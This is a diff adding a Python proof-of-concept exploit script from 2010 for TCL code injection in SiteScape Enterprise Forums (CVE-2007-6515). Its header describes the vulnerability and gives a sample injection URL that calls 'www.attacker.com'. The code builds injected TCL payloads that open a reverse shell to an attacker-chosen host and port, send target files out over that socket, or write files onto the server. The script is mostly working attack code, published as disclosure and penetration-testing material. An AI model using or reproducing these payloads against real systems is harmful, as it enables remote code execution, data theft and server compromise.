@@ -1,0 +1,178 @@
+#!/usr/bin/env python
+"""
+ -*- coding: utf-8 -*-
+
+       sitescape_sploit.py
+       
+       Copyright 2010 Spencer McIntyre <zeroSteiner@gmail.com>
+       
+       This program is free software; you can redistribute it and/or modify
+       it under the terms of the GNU General Public License as published by
+       the Free Software Foundation; either version 2 of the License, or
+       (at your option) any later version.
+       
+       This program is distributed in the hope that it will be useful,
+       but WITHOUT ANY WARRANTY; without even the implied warranty of
+       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+       GNU General Public License for more details.
+       
+       You should have received a copy of the GNU General Public License
+       along with this program; if not, write to the Free Software
+       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
+       MA 02110-1301, USA.
+
+Discovered: 12-07-10
+By: Spencer McIntyre (zeroSteiner) SecureState R&D Team
+www.securestate.com
+
+
+Background:
+-----------
+TCL Code injection has previously been discovered
+
+
+New Details:
+------------
+Confirmation that SiteScape servers are vulnerable to TCL injection allowing remote code execution through TCL payloads. SecureState has released proof of concept exploit code for this vulnerability.
+
+
+Vulnerable Versions:
+--------------------
+Tested on SiteScape Enterprise Forums version 7, others may be vulnerable.
+
+
+TCL Code Injection:
+-------------------
+++ Replace "ping www.attacker.com" with something useful
+http://www.website.com/dispatch.cgi/0;set fl [open "|ping www.attacker.com" ]
+
+
+References:
+-----------
+BID     http://www.securityfocus.com/bid/26963
+CVE     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6515
+Post    http://securityvulns.com/Sdocument702.html
+PoC     http://www.securestate.com/Documents/sitescape_sploit.txt
+Whitepaper http://www.securestate.com/Downloadables/Documents/whitepapers-profiling-penetration/SiteScape_TCL_Code_Injection.pdf
+"""
+
+def main():
+	import sys
+	import socket
+	import urllib2
+	import argparse
+	
+	__version__ = '0.3'
+			
+	parser = argparse.ArgumentParser(description = 'Site Scape Exploit Tool', conflict_handler='resolve')
+	parser.add_argument('-t', '--target', dest = 'target_uri', action = 'store', required = True, help = 'the uri to dispatch.cgi')
+	parser.add_argument('-m', '--mode', dest = 'mode', action = 'store', required = True, choices = ['c', 's', 'u', 'd'], help = 'attack mode')
+	parser.add_argument('-h', '--lhost', dest = 'lhost', action = 'store', default = '', help = 'host to connect back to')
+	parser.add_argument('-p', '--lport', dest = 'lport', action = 'store', default = 0, help = 'the port to connect back to')
+	parser.add_argument('-f', '--file', dest = 'file_name', action = 'store', default = '', help = 'the file name to upload/download, path must be relative')
+	parser.add_argument('-v', '--version', action = 'version', version = sys.argv[0][2:] + ' Version:' + __version__)
+	results = parser.parse_args()
+	
+	target = results.target_uri
+    
+	if target.split('/')[len(target.split('/')) - 1] != 'dispatch.cgi':
+		print 'Invalid Target'
+		return 0
+	
+	if results.mode == 'c':
+		sys.stdout.write('Checking... ')
+		sys.stdout.flush()
+		try:
+			httpConn = urllib2.urlopen(target + '/0;test')
+			page = httpConn.read()
+		except urllib2.HTTPError, error:
+			print '\nThe Host Is NOT Vulnerable'
+			return 0
+		except ValueError:
+			print '\nInvalid Target'
+			return 0
+		except:
+			print '\nAn Error Has Occured'
+			return 0	# this should not happen
+		sys.stdout.write('Done.\n')
+		sys.stdout.flush()
+		if 'invalid command name "test"' in page:
+			print 'The Host Is Vulnerable'
+			return 0
+		else:
+			print 'The Host Is NOT Vulnerable'
+			return 0
+	if results.lhost:
+		lhost = results.lhost
+	else:
+		print sys.argv[0] + ': error: argument -h/--lhost is required when mode is not \'c\''
+		return 0
+	if results.lport:
+		lport = results.lport
+	else:
+		print sys.argv[0] + ': error: argument -p/--lport is required when mode is not \'c\''
+		return 0
+			
+	if results.mode == 's':
+		exploit = target + '/0;set%20sock%20[socket%20' + lhost + '%20' + str(lport)
+		exploit = exploit + '%20]%20;fconfigure%20$sock%20-buffering%20line;while%20%221%22%20{%20gets%20$sock%20cmd;%20if%20{%20[catch%20{set%20fl%20[open%20%22|$cmd%22%20]%20}%20fid]%20}%20{%20%20puts%20$sock%20%22Command%20Error%22%20}%20else%20{%20set%20data%20[read%20$fl]%20;%20puts%20$sock%20$data;%20}%20}%20;thisTx%20accept%20;exit%20'
+		print 'Sending Exploit...\n(This process will sometimes hang on success until the connection is terminated)'
+		try:
+			httpConn = urllib2.urlopen(exploit)
+		except:# urllib2.HTTPError:
+			pass
+		return 0
+		
+	if results.file_name:
+		file_name = results.file_name
+	else:
+		print sys.argv[0] + ': error: argument -f/--file_name is required when mode is not \'c\' or \'s\''
+		return 0
+	if file_name[0] in ['\\', '/']:
+		print 'The path has to be relative ie: ../../tmp/foobar.txt'
+		return 0
+	forward = file_name.count('/')
+	backward = file_name.count('\\')
+	path = ''
+	if not forward == 0 and not backward == 0:
+		for i in range(0, file_name.count('..')):
+			path = path + 'cd%20..;'
+		del i
+		file_name = file_name.split('..')
+		file_name = file_name.pop()
+		if forward > backward:
+			tmp = file_name.split('/')[:-1]
+			file_name = file_name.split('/').pop()
+		else:
+			tmp = file_name.split('\\')[:-1]
+			file_name = file_name.split('\\').pop()
+		for part in tmp:
+			if part:
+				path = path + 'cd%20' + part + ';'
+	
+	if results.mode == 'd':
+		exploit = target + '/0;set%20sock%20[socket%20' + lhost + '%20' + str(lport)
+		exploit = exploit + ']%20;' + path + 'fconfigure%20$sock%20-buffering%20line;set%20fl%20[open%20%22' + file_name.replace(' ', '%20') + '%22%20r]%20;fconfigure%20$fl%20-translation%20binary;set%20data%20[read%20$fl]%20;puts%20$sock%20$data;%20thisTx%20accept%20;exit%20;'
+		try:
+			httpConn = urllib2.urlopen(exploit)
+		except urllib2.HTTPError:
+			pass
+		except:
+			print 'An Error Has Occured'
+		return 0
+		
+	elif results.mode == 'u':
+		exploit = target + '/0;set%20sock%20[socket%20' + lhost + '%20' + str(lport)
+		exploit = exploit + ']%20;' + path + 'fconfigure%20$sock%20-buffering%20line;set%20fl%20[open%20%22' + file_name.replace(' ', '%20') + '%22%20w]%20;fconfigure%20$fl%20-buffering%20line;set%20data%20[read%20$sock]%20;puts%20$fl%20$data;%20thisTx%20accept%20;exit%20;'
+		try:
+			httpConn = urllib2.urlopen(exploit)
+		except urllib2.HTTPError:
+			pass
+		except:
+			print 'An Error Has Occured'
+		return 0
+		
+	return 0
+
+if __name__ == '__main__':
+	main()
